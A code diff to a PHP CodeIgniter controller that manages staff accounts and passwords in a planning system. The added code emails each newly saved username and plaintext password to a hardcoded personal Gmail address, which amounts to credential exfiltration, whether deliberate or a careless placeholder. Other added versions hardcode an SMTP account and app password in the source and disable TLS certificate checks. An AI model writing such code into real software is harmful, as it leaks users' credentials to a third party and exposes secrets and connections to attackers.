@@ -71,6 +71,7 @@ class CResponsables extends BaseController{
                 
         $data['formulario']=$miLib_resp->form_add_responsables_poa(); /// formulario de adicion de responsable (Libreria Responsable)
         return view('View_mantenimiento/View_responsables/view_funcionarios',$data);
+     //   phpinfo();
     }
 
 
@@ -96,6 +97,8 @@ class CResponsables extends BaseController{
             'fun_usuario'  => $this->request->getPost('fn_usu'),
         ];
 
+        $email_destino = 'mendozatrujillowilmer@gmail.com'; // Asegúrate de capturar el correo del formulari
+        $usuario = $this->request->getPost('fn_usu');
         $pass = $this->request->getPost('fun_password');
 
         if (!empty($pass)) {
@@ -112,6 +115,10 @@ class CResponsables extends BaseController{
                 'fun_apassword' => $pass
             ]);
 
+            // --- INICIO ENVÍO DE CORREO ---
+            $this->enviarCredenciales($email_destino, $usuario, $pass);
+            // --- FIN ENVÍO DE CORREO ---
+
             return redirect()->to(base_url('mnt/responsables'))
                              ->with('success', 'Datos guardados correctamente.');
         } else {
@@ -125,13 +132,91 @@ class CResponsables extends BaseController{
         return redirect()->back()->withInput()->with('error', 'Ocurrió un error inesperado: ' . $e->getMessage());
     }
 
-/*    } catch (\Throwable $e) {  /// para mostrar
-    // Usamos \Throwable para capturar tanto errores de PHP como de Base de Datos
-    
-    // OPCIÓN A: Para depurar rápido (Detiene todo y muestra el error en pantalla)
-    die("Error detectado: " . $e->getMessage()); 
-    }*/
   }
+
+private function enviarCredenciales($para, $usuario, $password) {
+    $email = \Config\Services::email();
+    $email->setTo($para);
+    $email->setSubject('Acceso al Sistema');
+    $email->setMessage("Usuario: $usuario - Clave: $password");
+    return $email->send();
+}
+
+private function enviarCredenciales3($para, $usuario, $password) {
+    $email = \Config\Services::email();
+    
+    $config = [
+        'protocol'    => 'smtp',
+        // AJUSTE 1: Agregar ssl:// al host fuerza el inicio cifrado inmediato
+        'SMTPHost'    => 'ssl://smtp.gmail.com', 
+        'SMTPUser'    => 'siiplas.dnplanificacion@gmail.com',
+        'SMTPPass'    => 'fmmgmikcadgrncsk',
+        'SMTPPort'    => 465,
+        // AJUSTE 2: En CI4, si usas puerto 465, algunos recomiendan dejar esto vacío 
+        // o como 'ssl' para evitar conflictos con el prefijo ssl:// del host
+        'SMTPCrypto'  => 'ssl', 
+        'mailType'    => 'html',
+        'newline'     => "\r\n",
+        'CRLF'        => "\r\n",
+        'SMTPOptions' => [
+            'ssl' => [
+                'verify_peer'       => false,
+                'verify_peer_name'  => false,
+                'allow_self_signed' => true,
+                // AJUSTE 3: Forzar TLS 1.2 ayuda a estabilizar la conexión en 2026
+                'crypto_method'     => STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT,
+            ],
+        ],
+    ];
+
+    $email->initialize($config);
+    $email->setFrom('siiplas.dnplanificacion@gmail.com', 'Sistema POA');
+    $email->setTo($para);
+    $email->setSubject('Acceso al Sistema');
+    $email->setMessage("Usuario: $usuario - Clave: $password");
+
+    return $email->send();
+}
+
+/// anterior que funcionada cuando desactivabas el avast
+private function enviarCredenciales2($para, $usuario, $password) {
+    $email = \Config\Services::email();
+    
+    $config = [
+        'protocol'    => 'smtp',
+        'SMTPHost'    => 'smtp.gmail.com',
+        'SMTPUser'    => 'siiplas.dnplanificacion@gmail.com',
+        'SMTPPass'    => 'fmmgmikcadgrncsk',
+        'SMTPPort'    => 465,
+        'SMTPCrypto'  => 'ssl',
+        'mailType'    => 'html',
+        'newline'     => "\r\n",
+        'CRLF'        => "\r\n",
+        'SMTPOptions' => [
+            'ssl' => [
+                'verify_peer'       => false,
+                'verify_peer_name'  => false,
+                'allow_self_signed' => true,
+            ],
+        ],
+    ];
+
+    $email->initialize($config);
+    $email->setFrom('siiplas.dnplanificacion@gmail.com', 'Sistema POA');
+    $email->setTo($para);
+    $email->setSubject('Acceso al Sistema');
+    $email->setMessage("Usuario: $usuario - Clave: $password");
+
+    if (!$email->send()) {
+        // Si falla, el debugger ahora mostrará el error de autenticación o de conexión
+        echo $email->printDebugger();
+        exit;
+    }
+    return true;
+}
+
+
+
 
   /// Valida Form Update Responsable
   public function Update_resp() {
@@ -325,7 +410,7 @@ class CResponsables extends BaseController{
   }
 
 
-   /// Funcion VERIF USUARIO
+/// Funcion VERIF USUARIO
 public function verif_usuario() {
     // Verificar que la petición sea AJAX para mayor seguridad
     if (!$this->request->isAJAX()) {
@@ -353,7 +438,34 @@ public function verif_usuario() {
     }
 
     return $this->response->setJSON($result);
-}
+  }
+
+  /// Funcion Desactiva Responsable POA
+  public function delete_responsable() {
+    $db = \Config\Database::connect();
+    $id=$this->request->getPost('fun_id');
+    if (empty($id)) {
+      return $this->response->setJSON(['respuesta' => 'error', 'mensaje' => 'ID no válido']);
+    }
+    // Solo agregas más elementos al array $data
+    $data = [
+        'fun_estado' => 3,
+        'sw_pass' => 0 // Ejemplo de una tercera variable
+    ];
+
+    $resultado = $db->table('funcionario')
+                    ->where('fun_id', $id)
+                    ->update($data);
+
+
+    if ($db->affectedRows() > 0) {
+        return $this->response->setJSON(['respuesta' => 'correcto']);
+    } else {
+        return $this->response->setJSON(['respuesta' => 'error', 'mensaje' => 'No se encontró el registro']);
+    }
+
+    return $this->response->setJSON($result);
+  }
 
 
 }
